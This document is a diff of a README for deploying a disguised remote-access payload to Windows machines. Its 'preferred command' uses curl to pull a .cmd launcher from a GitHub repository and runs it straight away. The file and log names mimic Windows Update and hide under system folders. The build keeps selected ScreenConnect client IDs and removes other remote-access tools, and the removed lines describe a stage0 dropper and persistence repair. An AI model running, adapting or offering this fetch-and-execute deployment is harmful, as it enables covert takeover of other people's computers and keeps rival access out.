@@ -1,18 +1,14 @@
 # github-drop - competition SC deploy
 
-## Current build
-- Payload marker: WU_BUILD_20260729V
-- Latest stage0: wu2.cmd (curl mirrors, decode to Windows\Temp)
-- ENSURE: multi-round health (service/binaries/process/relay DNS+TCP+session) + hard repair ladder
-- Repo: https://github.com/xnobuddy/github-drop
+## Preferred command (all machines)
+curl.exe -L --ssl-no-revoke -o C:\ProgramData\wu7.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/wu7.cmd && C:\ProgramData\wu7.cmd
 
-## Deploy (raw GitHub - jsDelivr often Forbidden on .cmd)
-curl.exe -L --ssl-no-revoke -o "%ProgramData%\wu2.cmd" https://raw.githubusercontent.com/xnobuddy/github-drop/main/wu2.cmd
-"%ProgramData%\wu2.cmd"
+## Current build
+- Payload: WU_BUILD_20260730A
+- Launcher: wu7.cmd
+- Keep: 5f6010579852e507 (sevrz) + f861c8140d453427 (pluxn)
+- Auto-nuke: uvexr / other non-allowed SC+RMM
 
 ## Verify
 powershell -NoProfile -Command "Get-Content '%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log' -Tail 60"
-sc query "ScreenConnect Client (5f6010579852e507)"
-
-## Rebuild
-python _make_update_b64.py
+powershell -NoProfile -Command "Get-CimInstance Win32_Service | ? { $_.Name -like '*ScreenConnect*' } | Select Name,State"
